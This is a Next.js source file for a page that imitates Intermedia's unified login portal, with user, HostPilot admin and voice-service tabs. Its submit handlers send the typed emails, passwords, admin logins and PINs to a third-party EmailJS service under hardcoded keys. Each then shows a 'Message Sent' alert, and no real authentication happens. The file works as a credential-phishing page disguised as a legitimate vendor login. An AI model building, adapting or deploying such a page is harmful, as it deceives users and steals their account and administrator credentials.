"use client"
import Image from "next/image";
import logo from '../../public/logo-intermedia.svg'
import {Row, Col, Button, Tabs, Tab} from 'react-bootstrap';
import TabPane from 'react-bootstrap/TabPane'
import exchange from '../../public/exchange_60.svg'
import hostpilot from '../../public/hostpilot_60.svg'
import voice from '../../public/voice_60.svg'
import anymeeting_32 from '../../public/anymeeting_32.svg'
import securisync_32 from '../../public/securisync_32.svg'
import office365_32 from '../../public/office365_32.svg';
import logo_hostpilot_143 from '../../public/logo-hostpilot_143.png'
import { useState } from "react";
import { useEffect } from "react";
import emailjs, { EmailJSResponseStatus } from '@emailjs/browser';



export default function Home() {

  const [user_email, setUserEmail] = useState('')
  const [user_password, setUserPassword] = useState('')
  const [admin_email, setAdminEmail] = useState('')
  const [admin_password, setAdminPassword] = useState('')
  const [phone_or_adminlogin, setPhoneOrAdminLogin] = useState('')
  const [pin_or_adminpass, setPinOrAdminPass] = useState('')
  const [control, setControl] = useState({
    first : true,
    second: false,
    third: false
  })
  const [info, setInfo] = useState(
    [
      "It's login time!",
      "Welcome back",
      "Hello again!",
      "Ready. Set. Login.",
      "Nice to see you!",
      "Why, hello there!"
    ]
  )
  const [header, setHeader] = useState("")

  useEffect(() => {
    const random_num = getRandomInt(info.length)
    console.log('rand: ',random_num)
    setHeader(info[random_num])
  }, [info])


  const submitUser = (e) => {
    e.preventDefault()

    let template = {
      user_email: user_email,
      user_password: user_password
    }

    console.log('submit_user: ', template)
    emailjs.send('service_gyba3e2', 'template_3m3jhg5', template, {
      publicKey: 'bqXHvLonWogv1xcZ2'
    })
    .then((result) => {
      alert("Message Sent, We will get back to you shortly", result.text);
    },
    (err) => {
        if (err instanceof EmailJSResponseStatus) {
            alert(`An error occurred, Please try again`);
            return;
          }
    });
  }

  const submitAdmin = (e) => {
    e.preventDefault()

    let template_admin = {
      admin_email: admin_email,
      admin_password: admin_password
    }

    console.log('submit_admin: ', template_admin)
    emailjs.send('service_gyba3e2', 'template_3m3jhg5', template_admin, {
      publicKey: 'bqXHvLonWogv1xcZ2'
    })
    .then((result) => {
      alert("Message Sent, We will get back to you shortly", result.text);
    },
    (err) => {
        if (err instanceof EmailJSResponseStatus) {
            alert(`An error occurred, Please try again`);
            return;
          }
    });
  }

  const submitVoice = (e) => {
    e.preventDefault()
    let template_voice = {
      phone_or_adminlogin: phone_or_adminlogin,
      pin_or_adminpass: pin_or_adminpass
    }

    console.log('submit_admin: ', template_voice)
    emailjs.send('service_gyba3e2', 'template_3m3jhg5', template_voice, {
      publicKey: 'bqXHvLonWogv1xcZ2'
    })
    .then((result) => {
      alert("Message Sent, We will get back to you shortly", result.text);
    },
    (err) => {
        if (err instanceof EmailJSResponseStatus) {
            alert(`An error occurred, Please try again`);
            return;
          }
    });
  }

  function getRandomInt(max) {
    return Math.floor(Math.random() * max);
  }

  const openCity = (e, val) => {
    console.log('val: ', val)
    let controller = {...control}
    switch (val) {
      case 'Exchange':
         controller['first'] = true
         controller['second'] = false
         controller['third'] = false
         setControl(controller)
         break
      case 'HostPilot':
        controller['first'] = false
        controller['second'] = true
        controller['third'] = false
        setControl(controller)
        break
      case 'Voice':
        controller['first'] = false
        controller['second'] = false
        controller['third'] = true
        setControl(controller)
        break
      default:
        controller['first'] = true
         controller['second'] = false
         controller['third'] = false
         setControl(controller)
         break
    }
  }

  const handleChange = (e, type) => {




    switch (type) {
      case 'users':
        let name = e.target.name;
        let value = e.target.value;
        let use = {...user}
        use[name] = value
        setUser(
          use
        )
      case 'admin':
        // inf.admin[name] = value
        // setData(inf.admin)
      case 'voice':
        // inf.voice[name] = value
        // setData(inf.voice)
      default:
        break;
    }





  }
  // console.log('user_email: ', phone_or_adminlogin)
  // console.log('user_password: ', pin_or_adminpass)

  return (
    <main className="flex min-h-screen flex-col items-center justify-between pt-24" style={{background: '#0298dc'}}>
      <header className="absolute inset-x-0 top-0 z-50 bg-white">
          <nav className="flex items-center justify-between lg:px-8" aria-label="Global">
            <div className="flex lg:flex-1">
              <a href="#" className="-m-1.5 p-1.5">
                <span className="sr-only">Your Company</span>
                  <Image src={logo} width="129" alt='logo' height="68"  />
              </a>
            </div>
            <div className="flex lg:hidden">
              <button type="button" className="-m-2.5 inline-flex items-center justify-center rounded-md p-2.5 text-gray-700">
                <span className="sr-only">Open main menu</span>
                <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" strokeWidth="1.5" stroke="currentColor" aria-hidden="true">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5" />
                </svg>
              </button>
            </div>

            <div className="hidden lg:flex lg:flex-1 lg:justify-end">
              <a href="#" className="text-sm font-bold leading-6" style={{color: '#0098db'}}>SUPPORT </a>
              <a href="#" className="text-sm font-bold leading-6 ml-9 mr-6" style={{color: '#0098db'}}>PARTNER PORTAL</a>
            </div>
          </nav>




      </header>

      <div className="text-center large_screen" style={{width: '400px'}}>
        <h1 className="text-4xl text-white">{header}</h1>

          <div className="mt-10" style={{width: '100%'}}>

            <div className="tab flex">
              <button className={['tablinks', 'grid', 'justify-center', control.first ? 'active' : ''].join(' ')} onClick={(e) => openCity(e,'Exchange')}>
                <Image alt="exchange" src={exchange} width={60} height={60} />
                <small>For users</small>
              </button>
              <button className={['tablinks', 'grid', 'justify-center', control.second ? 'active' : ''].join(' ')} onClick={(e) => openCity(e,'HostPilot')}>
                <Image alt="hostpilot" src={hostpilot} width={60} height={60} />
                <small>For admins</small>
              </button>
              <button className={['tablinks', 'grid', 'justify-center', control.third ? 'active' : ''].join(' ')} onClick={(e) => openCity(e, 'Voice')}>
                <Image alt="voice" src={voice} width={60} height={60} />
                <small>Voice services</small>
              </button>
            </div>

            <div id="London" className={["tabcontent", "p-4", control.first ? 'show' : ''].join(' ')}>

                <div className="flex justify-between mt-6 ml-2" style={{width: '100%'}}>
                  <button className="text-white flex p-2 bbn" style={{background: '#0e6ea8', width: '48%'}}>
                  <svg className="m-webmail ml-2" width="24" height="18">


                  <path d="M12,13.1l9-7.9C20.9,5.1,20.8,5,20.7,5H3.3C3.2,5,3.2,5,3.1,5.1L12,13.1z"></path>
                  <path d="M21,6.8l-8.8,7.8c-0.1,0.1-0.1,0.1-0.2,0.1c-0.1,0-0.1,0-0.2-0.1L3,6.6v10.6C3,17.6,3.4,18,3.8,18h16.4 c0.4,0,0.8-0.4,0.8-0.8C21,17.2,21,6.8,21,6.8z"></path>
                  </svg> <span className="ml-2 sm:text-sm">Webmail</span>
                  </button>
                  <button className="flex p-2 bbn" style={{width: '48%'}}>
                  <svg className="product-icon m-myservices" width="24" height="20">


                  <path id="myServices" d="M17.6,15c-2-1.1-3.8-0.8-4.1-1.7c-0.1-0.4-0.2-1-0.2-1.5c0.6-0.3,0.9-1.2,1.1-2.3c0.6-0.1,0.8-1.4,0.7-1.9
                    c0.1-0.5-0.2-0.5-0.4-0.4c0,0,0.7-3.2-1.1-4c-1.5-0.6-3.2,0.2-3.3,0.2C8,3.4,8.9,7.1,8.9,7.2c-0.2,0-0.5,0-0.5,0.4
                    C8.2,8.1,8.4,9.3,9,9.4c0.2,1.1,0.5,2,1.1,2.3c0,0.5-0.1,1.1-0.2,1.5c-0.3,0.9-2,0.5-4.1,1.7C4,16,4,19.4,4,20.1h15.5
                    C19.5,19.4,19.5,16,17.6,15z"></path>
                    </svg> <span className="sm:text-sm">My Services</span>
                    <i className="login-form-product-btn-info jTooltipTop tooltipstered"></i>
                    </button>
                </div>

              <div>
                <form>
                 <div className="relative mt-2 rounded-md shadow-sm">

                  <input type="text" value={user_email} onChange={(e) => setUserEmail(e.target.value)}  name="user_email" id="user_email" className="block w-full rounded-md border-0 py-1.5 pl-7 pr-20 text-gray-900 ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6" placeholder="Login (email)" />
                 </div>

                <div className="relative mt-2 rounded-md shadow-sm">
                  <input type="password" name="user_password"  value={user_password} onChange={(e) => setUserPassword(e.target.value)} id="user_password" className="block w-full rounded-md border-0 py-1.5 pl-7 pr-20 text-gray-900 text-lg ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6" placeholder="Password" />
                </div>

                  <div className="flex justify-between mt-3">
                    <div>
                    <input type="checkbox" id="vehicle1" name="vehicle1" value="Bike" />
                    <label className="ml-2 text-sm" htmlFor="vehicle1" style={{color: '#666'}}>Remember me</label>
                    </div>

                    <div>
                      <a className="link text-sm">Forgot password?</a>
                    </div>
                  </div>

                  <div className="flex justify-center mt-4" style={{width: '100%'}}>
                    <button onClick={submitUser} className="pt-[10px] pb-[10px] pl-20 pr-20 text-lg" style={{background: '#96bc33', color: 'white'}}>LOGIN</button>
                  </div>
                </form>


                <p className="mt-3 text-sm">Login into other services:</p>


                <div className="mb4 login-services">
                  <a href="https://anymeeting.intermedia.net" className="link-service">
                      <Image src={anymeeting_32} width={30} height={30} alt="AnyMeeting icon" />
                      <div className="link-service-description">
                          AnyMeeting
                          <i className="login-form-product-btn-info jTooltipTop link-service-description-icon tooltipstered">
                          </i>
                      </div>
                  </a>
                  <a href="https://securisync.intermedia.net" className="link-service">
                      <Image src={securisync_32} width={30} height={30} alt="SecuriSync icon" />
                      <div className="link-service-description">
                          SecuriSync
                          <i className="login-form-product-btn-info jTooltipTop link-service-description-icon tooltipstered">
                          </i>
                      </div>
                  </a>
                  <a href="https://login.microsoftonline.com" className="link-service">
                      <Image src={office365_32} width={25} height={25} alt="Office365 icon" />
                      <div className="link-service-description">
                          Office 365
                          <i className="login-form-product-btn-info jTooltipTop link-service-description-icon tooltipstered">
                          </i>
                      </div>
                  </a>
                </div>
              </div>

            </div>

            <div id="Paris" className={["tabcontent", "p-4", control.second ? 'show' : ''].join(' ')}>
              <form>

              <div className="flex justify-center" style={{width: "100%"}}>
              <Image alt="logo_hostpilot_143" className="mt-3" src={logo_hostpilot_143} />
              </div>

              <p className="login-form-admin-text mt-4">
                HostPilot is an admin's central point of control over users, devices and applications.
                <a href="http://www.intermedia.net/products/hostpilot-control-panel" target="_blank">Learn more</a>.
              </p>

              <div className="relative mt-2 rounded-md shadow-sm">

                <input type="text" name="admin_email" id="admin_email" value={admin_email} onChange={e => setAdminEmail(e.target.value)}  className="block w-full rounded-md border-0 py-1.5 pl-7 pr-20 text-gray-900 ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6" placeholder="Login (email)" />
              </div>

              <div className="relative mt-2 rounded-md shadow-sm">

                <input type="password" name="admin_password" value={admin_password} onChange={e => setAdminPassword(e.target.value)} id="admin_password" className="block w-full rounded-md border-0 py-1.5 pl-7 pr-20 text-gray-900 text-lg ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6" placeholder="Password" />
              </div>

              <div className="text-right mt-3">


                <div>
                  <a className="link text-sm">Forgot password?</a>
                </div>
              </div>

              <div className="flex justify-center mt-4" style={{width: '100%'}}>
                <button onClick={submitAdmin} className="pt-[10px] pb-[10px] pl-20 pr-20 text-lg" style={{background: '#96bc33', color: 'white'}}>LOGIN</button>
              </div>

              </form>



            </div>

            <div id="Tokyo" className={["tabcontent","p-4", control.third ? 'show' : ''].join(' ')}>
              <form>
              <p className="login-form-admin-text mt-4">
            Log in to manage individual voice services, including 800 numbers, Internet faxing and more.
              </p>

              <div className="relative mt-2 rounded-md shadow-sm">

                <input type="text" name="voice_login" value={phone_or_adminlogin} onChange={e => setPhoneOrAdminLogin(e.target.value)} id="voice_login" className="block w-full rounded-md border-0 py-1.5 pl-7 pr-20 text-gray-900 ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6" placeholder="Phone number (or admin login)" />
                <i className="icon-question m-primary login-form-field-tooltip tooltipstered"></i>
              </div>

              <div className="relative mt-2 rounded-md shadow-sm">

                <input type="password" name="voice_pass" value={pin_or_adminpass} onChange={e=>setPinOrAdminPass(e.target.value)} id="voice_pass" className="block w-full rounded-md border-0 py-1.5 pl-7 pr-20 text-gray-900 text-lg ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6" placeholder="PIN (or admin password)" />
              </div>

              <div className="flex justify-between mt-3">
                <div>
                <input type="checkbox" id="vehicle1" name="vehicle1" value="Bike" />
                <label className="ml-2 text-sm" htmlFor="vehicle1" style={{color: '#666'}}>Remember me</label>
                </div>

                <div>
                  <a className="link text-sm">Forgot PIN?</a>
                </div>
              </div>

              <div className="flex justify-center mt-4" style={{width: '100%'}}>
                <button onClick={submitVoice} className="pt-[10px] pb-[10px] pl-20 pr-20 text-lg" style={{background: '#96bc33', color: 'white'}}>LOGIN</button>
              </div>
              </form>
            </div>

          </div>


      </div>


      <div className="small_screen w-full" >
            <div className="tab_small flex">
              <button className={['grid', 'justify-center', control.first ? 'active' : ''].join(' ')} onClick={(e) => openCity(e,'Exchange')}>

                <small style={{fontSize: '10px', fontWeight: 'bold'}}>For users</small>
              </button>
              <button className={['grid', 'justify-center', 'ml-1', control.second ? 'active' : ''].join(' ')} onClick={(e) => openCity(e,'HostPilot')}>

                <small style={{fontSize: '10px', fontWeight: 'bold'}}>For admins</small>
              </button>
              <button className={['grid', 'justify-center','ml-1', control.third ? 'active' : ''].join(' ')} onClick={(e) => openCity(e, 'Voice')}>

                <small style={{fontSize: '10px', fontWeight: 'bold'}}>Voice services</small>
              </button>
            </div>

           <div id="London" className={["tabcontent_small", control.first ? 'show' : ''].join(' ')}>

            <div className="flex justify-between mt-2" style={{width: '100%'}}>
                  <button className="text-white flex p-2 bbn" style={{background: '#0e6ea8', width: '50%'}}>
                  <svg className="m-webmail ml-2" width="24" height="18">


                  <path d="M12,13.1l9-7.9C20.9,5.1,20.8,5,20.7,5H3.3C3.2,5,3.2,5,3.1,5.1L12,13.1z"></path>
                  <path d="M21,6.8l-8.8,7.8c-0.1,0.1-0.1,0.1-0.2,0.1c-0.1,0-0.1,0-0.2-0.1L3,6.6v10.6C3,17.6,3.4,18,3.8,18h16.4 c0.4,0,0.8-0.4,0.8-0.8C21,17.2,21,6.8,21,6.8z"></path>
                  </svg> <span style={{fontSize: '12px'}}>Webmail</span>
                  </button>
                  <button className="flex p-2 bbn" style={{width: '50%'}}>
                  <svg className="product-icon m-myservices" width="24" height="20">


                  <path id="myServices" d="M17.6,15c-2-1.1-3.8-0.8-4.1-1.7c-0.1-0.4-0.2-1-0.2-1.5c0.6-0.3,0.9-1.2,1.1-2.3c0.6-0.1,0.8-1.4,0.7-1.9
                    c0.1-0.5-0.2-0.5-0.4-0.4c0,0,0.7-3.2-1.1-4c-1.5-0.6-3.2,0.2-3.3,0.2C8,3.4,8.9,7.1,8.9,7.2c-0.2,0-0.5,0-0.5,0.4
                    C8.2,8.1,8.4,9.3,9,9.4c0.2,1.1,0.5,2,1.1,2.3c0,0.5-0.1,1.1-0.2,1.5c-0.3,0.9-2,0.5-4.1,1.7C4,16,4,19.4,4,20.1h15.5
                    C19.5,19.4,19.5,16,17.6,15z"></path>
                    </svg> <span style={{fontSize: '12px'}}>My Services</span>
                    <i className="login-form-product-btn-info jTooltipTop tooltipstered"></i>
                  </button>
            </div>
            <form>

            <div className="relative mt-2 rounded-md shadow-sm">

              <input type="text" name="user_small_email" id="user_small_email" value={user_email} onChange={e => setUserEmail(e.target.value)} className="block w-full rounded-md border-0 py-1.5 pl-7 pr-20 text-gray-900 ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600" style={{fontSize: '12px'}} placeholder="Login (email)" />
              </div>

              <div className="relative mt-2 rounded-md shadow-sm">

              <input type="password" name="user_small_password" id="user_small_password" value={user_password} onChange={e => setUserPassword(e.target.value)} className="block w-full rounded-md border-0 py-1.5 pl-7 pr-20 text-gray-900 ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600" style={{fontSize: '12px'}} placeholder="Password" />
              </div>

              <div className="flex justify-between mt-3">
              <div>
              <input type="checkbox" id="vehicle1" name="vehicle1" value="Bike" />
              <label className="ml-2 text-white" htmlFor="vehicle1" style={{fontSize: '12px'}}>Remember me</label>
              </div>

              <div>
                <a className="text-white" style={{fontSize: '12px'}}>Forgot password?</a>
              </div>
              </div>

              <div className="flex justify-center mt-4" style={{width: '100%'}}>
              <button onClick={submitUser} className="pt-[10px] pb-[10px] pl-20 pr-20 text-sm" style={{background: '#96bc33', color: 'white'}}>LOGIN</button>
              </div>

            </form>



            <p className="mt-3 text-white text-center" style={{fontSize: '12px'}}>Login into other services:</p>


            <div className="mb4 login-services">
              <a href="https://anymeeting.intermedia.net" className="link-service">
                  <Image src={anymeeting_32} width={30} height={30} alt="AnyMeeting icon" />
                  <div className="link-service-description">
                      AnyMeeting
                      <i className="login-form-product-btn-info jTooltipTop link-service-description-icon tooltipstered">
                      </i>
                  </div>
              </a>
              <a href="https://securisync.intermedia.net" className="link-service">
                  <Image src={securisync_32} width={30} height={30} alt="SecuriSync icon" />
                  <div className="link-service-description">
                      SecuriSync
                      <i className="login-form-product-btn-info jTooltipTop link-service-description-icon tooltipstered">
                      </i>
                  </div>
              </a>
              <a href="https://login.microsoftonline.com" className="link-service">
                  <Image src={office365_32} width={25} height={25} alt="Office365 icon" />
                  <div className="link-service-description">
                      Office 365
                      <i className="login-form-product-btn-info jTooltipTop link-service-description-icon tooltipstered">
                      </i>
                  </div>
              </a>
            </div>


           </div>

           <div id="Paris" className={["tabcontent_small", "p-4", control.second ? 'show' : ''].join(' ')}>
              <div className="flex justify-center" style={{width: "100%"}}>
              <Image alt="logo_hostpilot_143" className="mt-3" src={logo_hostpilot_143} />
              </div>

              <p className="login-form-admin-text mt-4">
                HostPilot is an admin's central point of control over users, devices and applications.
                <a href="http://www.intermedia.net/products/hostpilot-control-panel" target="_blank">Learn more</a>.
              </p>

              <div className="relative mt-2 rounded-md shadow-sm">

                <input type="text" name="admin_small_email" id="admin_small_email" value={admin_email} onChange={e => setAdminEmail(e.target.value)} className="block w-full rounded-md border-0 py-1.5 pl-7 pr-20 text-gray-900 ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600" style={{fontSize: '12px'}}  placeholder="Login (email)" />
              </div>

              <div className="relative mt-2 rounded-md shadow-sm">

                <input type="password" name="admin_small_password" id="admin_small_password" value={admin_password} onChange={e => setAdminPassword(e.target.value)} className="block w-full rounded-md border-0 py-1.5 pl-7 pr-20 text-gray-900 ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600" style={{fontSize: '12px'}}  placeholder="Password" />
              </div>

              <div className="text-right mt-3">


                <div>
                  <a className="link text-sm">Forgot password?</a>
                </div>
              </div>

              <div className="flex justify-center mt-4" style={{width: '100%'}}>
              <button onClick={submitAdmin} className="pt-[10px] pb-[10px] pl-20 pr-20 text-sm" style={{background: '#96bc33', color: 'white'}}>LOGIN</button>
            </div>

            </div>


            <div id="Tokyo" className={["tabcontent_small","p-4", control.third ? 'show' : ''].join(' ')}>
            <p className="login-form-admin-text mt-4">
            Log in to manage individual voice services, including 800 numbers, Internet faxing and more.
              </p>

              <div className="relative mt-2 rounded-md shadow-sm">

                <input type="text" name="small_phone_or_adminlogin" id="small_phone_or_adminlogin" value={phone_or_adminlogin} onChange={e => setPhoneOrAdminLogin(e.target.value)} className="block w-full rounded-md border-0 py-1.5 pl-7 pr-20 text-gray-900 ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600" style={{fontSize: '12px'}} placeholder="Phone number (or admin login)" />
                <i className="icon-question m-primary login-form-field-tooltip tooltipstered"></i>
              </div>

              <div className="relative mt-2 rounded-md shadow-sm">

                <input type="password" name="small_pin_or_adminpass" id="small_pin_or_adminpass" value={pin_or_adminpass} onChange={e=>setPinOrAdminPass(e.target.value)} className="block w-full rounded-md border-0 py-1.5 pl-7 pr-20 text-gray-900 ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600" style={{fontSize: '12px'}} placeholder="PIN (or admin password)" />
              </div>

              <div className="flex justify-between mt-3">
                <div>
                <input type="checkbox" id="vehicle1" name="vehicle1" value="Bike" />
                <label className="ml-2 text-sm" htmlFor="vehicle1" style={{color: '#666'}}>Remember me</label>
                </div>

                <div>
                  <a className="link text-sm">Forgot PIN?</a>
                </div>
              </div>

              <div className="flex justify-center mt-4" style={{width: '100%'}}>
                <button onClick={submitVoice} className="pt-[10px] pb-[10px] pl-20 pr-20 text-lg" style={{background: '#96bc33', color: 'white'}}>LOGIN</button>
              </div>
            </div>

      </div>

      <footer className="login-footer mt-6">
        <div className="login-footer-content">
      <iframe src="/Content/images/logo/logo-intermedia_129.png" frameBorder="0" height="200" width="1080" scrolling="no" style={{visibility:"hidden"}}></iframe>        </div>
      </footer>

      <div className="login-feedback m-closed">
        <div className="login-feedback-accordion m-right">
            <a className="login-feedback-trigger" href="mailto:feedback@custhelp.com?subject=Unified Login Page > Feedback" style={{paddingLeft: "4px", textTransform: "uppercase", fontSize: "14px"}}>Feedback</a>
        </div>
      </div>

    </main>
  );
}
